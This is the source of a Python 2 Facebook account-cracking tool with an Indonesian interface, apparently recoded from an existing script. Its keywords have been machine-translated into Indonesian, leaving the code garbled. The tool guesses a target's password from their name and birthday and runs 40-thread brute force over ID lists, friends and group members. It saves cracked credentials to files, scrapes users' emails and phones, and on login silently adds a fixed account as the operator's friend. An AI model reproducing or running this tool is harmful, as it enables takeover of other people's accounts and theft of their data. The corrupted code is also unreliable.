# - * - coding: utf-8 - * -

impor os, sys, waktu, datetime, acak, hashlib, re, threading, json, getpass, urllib, permintaan, mekanisasi
dari multiprocessing.pool import ThreadPool

dari requests.exeption mengimpor ConnectionError
dari mekanis impor Browser
memuat ulang (sys)
sys.setdefaultencoding ('utf8')
br = mechanize.Browser ()
br.set_handle_robots (False)
br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Versi / 12.16')]


def keluar ():
    cetak '\ x1b [1; 91m [!] Ditutup'
    os.sys.exit ()


def jalan (z):
    untuk e in z + '\ n':
        sys.stdout.write (e)
        sys.stdout.flush ()
        time.sleep (0,01)

logo = "\ x1b [1; 97m█████████ \ n \ x1b [1; 97m█▄█████▄█ \ x1b [1; 96m ● ▬▬▬▬▬▬▬▬ ▬๑۩۩๑▬▬▬▬▬▬▬▬ ● \ n \ x1b [1; 97m█ \ x1b [1; 91m ▼ lanjutkan dilanjutkan dilanjutkan \ x1b [1; 97m- _ --_-- \ x1b [ 1; 92m╔╦╗┌─┐┬─┐┬┌─ ╔═╗╔╗ \ n \ x1b [1; 97m█ \ x1b [1; 97m \ x1b [1; 97m _-_-- -_ --__ \ x1b [1; 92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗ \ n \ x1b [1; 97m█ \ x1b [1; 91m ▲▲▲▲▲ \ x1b [1; 97m-- - _ - \ x1b [1; 92m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \ x1b [1; 93m✞ ঔৣ ۝ Ð řҟŦ řҟŦ řҟŦ ê ê ঔৣ✞ n \ n \ x1b [1; 97m██ ███████ \ x1b [1; 96m «========== ✧ ==========» \ n \ x1b [1; 97m ██ ██ \ n \ x1b [1; 97m╔═══════════════════════════════════════════ ═════╗ \ n \ x1b [1; 97m║ \ x1b [1; 93m * \ x1b [1; 97mReCode \ x1b [1; 91m: \ x1b [1; 96m ꧁ ࿇MR.N0N4M3 ࿇ ꧂ \ x1b [1] ; 97m ║ \ n \ x1b [1; 97m║ \ x1b [1; 93m * \ x1b [1; 97mGitHub \ x 1b [1; 91m: \ x1b [1; 92m \ x1b [mhttps: //github.com/Zxulme \ x1b [\ x1b [1; 97m ║ \ n \ x1b [1; 97m║ \ x1b [1; 93m * \ x1b [1; 97mFB \ x1b [1; 91m: \ x1b [1; 92 \ x1b [mhttps: // fb.

def tik ():
    titik = [
     ' ',' .. ',' ... ']
    untuk o di titik:
        cetak '\ r \ x1b [1; 91m [\ xe2 \ x97 \ x8f] \ x1b [1; 92mMemuatkan \ x1b [1; 97m' + o,
        sys.stdout.flush ()
        time.sleep (1)


kembali = 0
utas = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\ x1b [31mNidak Vuln'
vuln = '\ x1b [32mVuln'


def login ():
    os.system ('jelas')
    mencoba:
        toket = buka ('login.txt', 'r')
        menu()
    kecuali (KeyError, IOError):
        os.system ('jelas')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak '\ x1b [1; 91m [\ xe2 \ x98 \ x86] \ x1b [1; 92mLOGIN AKUN FACEBOOK \ x1b [1; 91m [\ xe2 \ x98 \ x86]'
        id = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 36mPengguna \ x1b [1; 91m: \ x1b [1; 92m')
        pwd = getpass.getpass ('\ x1b [1; 91m [+] \ x1b [1; 36mPassword \ x1b [1; 91m: \ x1b [1; 92m')
        tik ()
        mencoba:
            br.open ('https://m.facebook.com')
        kecuali mekanisasi.
            cetak '\ n \ x1b [1; 91m [!] Tidak ada koneksi'
            keluar ()

        br._factory.is_html = Benar
        br.select_form (nr = 0)
        br.form ['email'] = id
        br.form ['pass'] = pwd
        mengirimkan ()
        url = br.geturl ()
        jika 'save-device' di url:
            mencoba:
                sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = kata sandiemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.logo04campanye_compartemenempatcampas_campas_data_data_data_singkat_04_data_data_data_data_data_data_dikartikel'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'kata sandi', 'email': id, 'format': 'JSON', 'menghasilkan_machine_id': '1', 'menghasilkan_session_cookies': '1', ' lokal ':' en_US ',' metode ':' auth.login ',' kata sandi ': pwd,' return_ssl_resources ':' 0 ',' v ':' 1.0 '}
                x = hashlib.new ('md5')
                x.perbarui (sig)
                a = x.hexdigest ()
                data.update ({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get (url, params = data)
                z = json.loads (r.text)
                zedd = terbuka ('login.txt', 'w')
                zedd.write (z ['access_token'])
                zedd.close ()
                cetak '\ n \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mLogin sukses'
                requests.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z ['access_token'])
                time.sleep (2)
                menu()
            kecuali requests.exceptions.ConnectionError:
                cetak '\ n \ x1b [1; 91m [!] Tidak ada koneksi'
                keluar ()

        jika 'pos pemeriksaan' di url:
            cetak '\ n \ x1b [1; 91m [!] \ x1b [1; 93mAkun Telah Pos Pemeriksaan'
            os.system ('rm -rf login.txt')
            time.sleep (1)
            keluar ()
        lain:
            cetak '\ n \ x1b [1; 91m [!] Gagal masuk'
            os.system ('rm -rf login.txt')
            time.sleep (1)
            masuk()


menu def ():
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        os.system ('jelas')
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()
    lain:
        mencoba:
            otw = requests.get ('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads (otw.text)
            nama = a ['name']
            id = a ['id']
            ots = requests.get ('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads (ots.text)
            sub = str (b ['ringkasan'] ['total_count'])
        kecuali KeyError:
            os.system ('jelas')
            cetak '\ x1b [1; 91m [!] \ x1b [1; 93mSepertinya akun kena Checkpoint'
            os.system ('rm -rf login.txt')
            time.sleep (1)
            masuk()
        kecuali requests.exceptions.ConnectionError:
            cetak logo
            cetak '\ x1b [1; 91m [!] Tidak ada koneksi'
            keluar ()

    os.system ('jelas')
    cetak logo
    cetak '\ x1b [1; 97m \ xe2 \ x95 \ x94' + 50 * '\ xe2 \ x95 \ x90' + '╗'
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Nama \ x1b [1; 91m: \ x1b [1; 92m '+ nama + (39 - len (nama)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m FBID \ x1b [1; 91m: \ x1b [1; 92m '+ id + (39 - len (id)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Subs \ x1b [1; 91m: \ x1b [1; 92m '+ sub + (39 - len (sub)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ x1b [1; 97m╠' + 50 * '\ xe2 \ x95 \ x90' + '╝'
    cetak '║-> \ x1b [1; 37; 40m1. Informasi pengguna'
    cetak '║-> \ x1b [1; 37; 40m2. Retas Akun Facebook '
    cetak '║-> \ x1b [1; 37; 40m3. Bot
    cetak '║-> \ x1b [1; 37; 40m4. Lainnya
    cetak '║-> \ x1b [1; 37; 40m5. Memperbarui'
    cetak '║-> \ x1b [1; 37; 40m6. Keluar'
    cetak '║-> \ x1b [1; 31; 40m0. Keluar'
    cetak '\ x1b [1; 37; 40m║'
    pilih ()


def pilih ():
    zedd = raw_input ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika zedd == '':
        cetak '\ x1b [1; 91m [!] Tidak dapat kosong'
        pilih ()
    lain:
        jika zedd == '1':
            informasi ()
        lain:
            jika zedd == '2':
                menu_hack ()
            lain:
                jika zedd == '3':
                    menu_bot ()
                lain:
                    jika zedd == '4':
                        lain ()
                    lain:
                        jika zedd == '5':
                            os.system ('jelas')
                            cetak logo
                            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                            os.system ('master asal tarik git')
                            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                            menu()
                        lain:
                            jika zedd == '6':
                                os.system ('rm -rf login.txt')
                                keluar ()
                            lain:
                                jika zedd == '0':
                                    keluar ()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + zedd + '\ x1b [1; 91mTidak tersedia'
                                    pilih ()


def informasi ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()

    os.system ('jelas')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    id = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mInput ID \ x1b [1; 97m / \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m')
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
    r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads (r.text)
    untuk p dalam kok ['data']:
        jika id di p ['name'] atau id di p ['id']:
            r = requests.get ('https://graph.facebook.com/' + p ['id'] + '? access_token =' + toket)
            z = json.loads (r.text)
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            mencoba:
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mName \ x1b [1; 97m:' + z ['name']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [?] \ x1b [1; 92mName \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'
            lain:
                mencoba:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mID \ x1b [1; 97m:' + z ['id']
                kecuali KeyError:
                    cetak '\ x1b [1; 91m [?] \ x1b [1; 92mID \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'
                lain:
                    mencoba:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mEmail \ x1b [1; 97m:' + z ['email']
                    kecuali KeyError:
                        cetak '\ x1b [1; 91m [?] \ x1b [1; 92mEmail \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'
                    lain:
                        mencoba:
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPhone Number \ x1b [1; 97m:' + z ['mobile_phone']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m [?] \ x1b [1; 92mTelepon \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'

                        mencoba:
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mLokasi \ x1b [1; 97m:' + z ['location'] ['name']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m [?] \ x1b [1; 92mLokasi \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'

                    mencoba:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mBirthday \ x1b [1; 97m:' + z ['birthday']
                    kecuali KeyError:
                        cetak '\ x1b [1; 91m [?] \ x1b [1; 92mBirthday \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'

                mencoba:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mSekolah \ x1b [1; 97m:'
                    untuk q dalam z ['pendidikan']:
                        mencoba:
                            cetak '\ x1b [1; 91m ~ \ x1b [1; 97m' + q ['school'] ['name']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m ~ \ x1b [1; 91mTidak ditemukan'

                kecuali KeyError:
                    lulus

            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu()
    lain:
        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Pengguna tidak ditemukan'
        raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
        menu()


menu_hack def ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()

    os.system ('jelas')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Mini Hack Facebook (\ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak '║-> \ x1b [1; 37; 40m2. Facebook Multi Bruteforce
    cetak '║-> \ x1b [1; 37; 40m3. Facebook Super Multi Bruteforce
    cetak '║-> \ x1b [1; 37; 40m4. BruteForce (\ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak '║-> \ x1b [1; 37; 40m5. Yahoo Checker
    cetak '║-> \ x1b [1; 37; 40m6. Dapatkan ID / Email / HP '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    hack_pilih ()


def hack_pilih ():
    hack = raw_input ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika retas == '':
        cetak '\ x1b [1; 91m [!] Tidak dapat kosong'
        hack_pilih ()
    lain:
        jika retas == '1':
            mini()
        lain:
            jika retas == '2':
                retak()
                hasil ()
            lain:
                jika retas == '3':
                    super()
                lain:
                    jika retas == '4':
                        kasar()
                    lain:
                        jika retas == '5':
                            menu_yahoo ()
                        lain:
                            jika retas == '6':
                                mengambil()
                            lain:
                                jika retas == '0':
                                    menu()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + retas + '\ x1b [1; 91mTidak ditemukan'
                                    hack_pilih ()


def mini ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()
    lain:
        os.system ('jelas')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak '\ x1b [1; 91m [INFO] Target harus menjadi teman Anda!'
        mencoba:
            id = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
            r = requests.get ('https://graph.facebook.com/' + id + '? access_token =' + toket)
            a = json.loads (r.text)
            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92m Memeriksa \ x1b [1; 97m ...')
            time.sleep (2)
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mBuka keamanan \ x1b [1; 97m ...')
            time.sleep (2)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            pz1 = a ['first_name'] + '123'
            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&==&&== URL ur & = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
            y = json.load (data)
            jika 'access_token' di y:
                cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz1
                raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                menu_hack ()
            lain:
                jika 'www.facebook.com' di y ['error_msg']:
                    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                    cetak '\ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz1
                    raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                    menu_hack ()
                lain:
                    pz2 = a ['first_name'] + '12345'
                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&==&&== URL ur & = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                    y = json.load (data)
                    jika 'access_token' di y:
                        cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                        cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz2
                        raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                        menu_hack ()
                    lain:
                        jika 'www.facebook.com' di y ['error_msg']:
                            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                            cetak '\ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz2
                            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                            menu_hack ()
                        lain:
                            pz3 = a ['last_name'] + '123'
                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&==&&== URL ur & = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                            y = json.load (data)
                            jika 'access_token' di y:
                                cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz3
                                raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                menu_hack ()
                            lain:
                                jika 'www.facebook.com' di y ['error_msg']:
                                    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                    cetak '\ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz3
                                    raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                    menu_hack ()
                                lain:
                                    lahir = a ['birthday']
                                    pz4 = lahir.replace ('/', '')
                                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&hl=id&em==&&==&= ur=id & urus== & urus== & ur=4&p=4&hl=id& ur=4&hl=id&us==&p=id&us==&p=id=id = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                    y = json.load (data)
                                    jika 'access_token' di y:
                                        cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                        cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz4
                                        raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                        menu_hack ()
                                    lain:
                                        jika 'www.facebook.com' di y ['error_msg']:
                                            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                            cetak '\ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                                            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
                                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 97m:' + id
                                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz4
                                            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                            menu_hack ()
                                        lain:
                                            cetak '\ x1b [1; 91m [!] Maaf, membuka target kata sandi gagal :('
                                            cetak '\ x1b [1; 91m [!] Coba metode lain.'
                                            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                            menu_hack ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] Terget tidak ditemukan'
            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_hack ()


def crack ():
    file global
    daftar global
    global passw
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()
    lain:
        os.system ('jelas')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        idlist = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mFile ID \ x1b [1; 91m: \ x1b [1; 97m')
        kata sandi = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m')
        mencoba:
            file = open (idlist, 'r')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
            untuk rentang x (40):
                zedd = threading.Thread (target = scrak, args = ())
                zedd.start ()
                threads.append (zedd)

            untuk zedd di utas:
                zedd.join ()

        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan'
            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_hack ()


def scrak ():
    kembali global
    global berhasil
    cekpoint global
    gagal global
    global
    mencoba:
        buka = ​​open (idlist, 'r')
        up = buka.read (). split ()
        saat mengajukan:
            username = file.readline (). strip ()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + nama pengguna & kata sandi 'ur & ur gambar & urus ur terlalu banyak' = 3f555f99fb61fcd7aa0c44f58f522ef6 '
            data = urllib.urlopen (url)
            mpsh = json.load (data)
            jika kembali == len (atas):
                istirahat
            jika 'access_token' di mpsh:
                bisa = terbuka ('Berhasil.txt', 'w')
                bisa.write (nama pengguna + '|' + passw + '\ n')
                bisa.close ()
                berhasil.append ('\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + nama pengguna + '|' + kata sandi)
                kembali + = 1
            lain:
                jika 'www.facebook.com' di mpsh ['error_msg']:
                    cek = terbuka ('Cekpoint.txt', 'w')
                    cek.write (nama pengguna + '|' + passw + '\ n')
                    cek.close ()
                    cekpoint.append ('\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + nama pengguna + '|' + kata sandi)
                    kembali + = 1
                lain:
                    gagal.append (nama pengguna)
                    kembali + = 1
            sys.stdout.write ('\ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack \ x1b [1; 91m: \ x1b [1; 97m '+ str (kembali) +' \ x1b [1; 96m> \ x1b [1; 97m '+ str (len (atas)) +' => \ x1b [1; 92mLive \ x1b [1; 91m : \ x1b [1; 96m '+ str (len (berhasil)) +' \ x1b [1; 97m => \ x1b [1; 93mPeriksa \ x1b [1; 91m: \ x1b [1; 96m '+ str (len (cekpoint))))
            sys.stdout.flush ()

    kecuali IOError:
        cetak '\ n \ x1b [1; 91m [!] Sambungan sibuk'
        time.sleep (1)
    kecuali requests.exceptions.ConnectionError:
        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'


def hasil ():
    mencetak
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    untuk b in berhasil:
        cetak b

    untuk c dalam cekpoint:
        cetak c

    mencetak
    cetak '\ x1b [31m [x] Gagal \ x1b [1; 97m ->' + str (len (gagal))
    keluar ()


def super ():
    toket global
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()

    os.system ('jelas')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Retak dari Teman
    cetak '║-> \ x1b [1; 37; 40m2. Retak dari Grup '
    cetak '║-> \ x1b [1; 37; 40m3. Retak dari File '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali '
    cetak '\ x1b [1; 37; 40m║'
    pilih_super ()


def pilih_super ():
    peak = raw_input ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika puncak == '':
        cetak '\ x1b [1; 91m [!] Tidak dapat kosong'
        pilih_super ()
    lain:
        jika puncak == '1':
            os.system ('jelas')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mMengambil id Teman \ x1b [1; 97m ...')
            r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads (r.text)
            untuk s in z ['data']:
                id.append (s ['id'])

        lain:
            jika puncak == '2':
                os.system ('jelas')
                cetak logo
                cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                idg = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mID Grup \ x1b [1; 91m: \ x1b [1; 97m')
                mencoba:
                    r = requests.get ('https://graph.facebook.com/group/?id=' + idg + '& access_token =' + toket)
                    asw = json.loads (r.text)
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName grup \ x1b [1; 91m: \ x1b [1; 97m' + asw ['name']
                kecuali KeyError:
                    cetak '\ x1b [1; 91m [!] Grup tidak ditemukan'
                    raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                    super()

                re = requests.get ('https://graph.facebook.com/' + idg + '/ members? bidang = nama, id & batas = 999999999 & access_token =' + toket)
                s = json.loads (re.text)
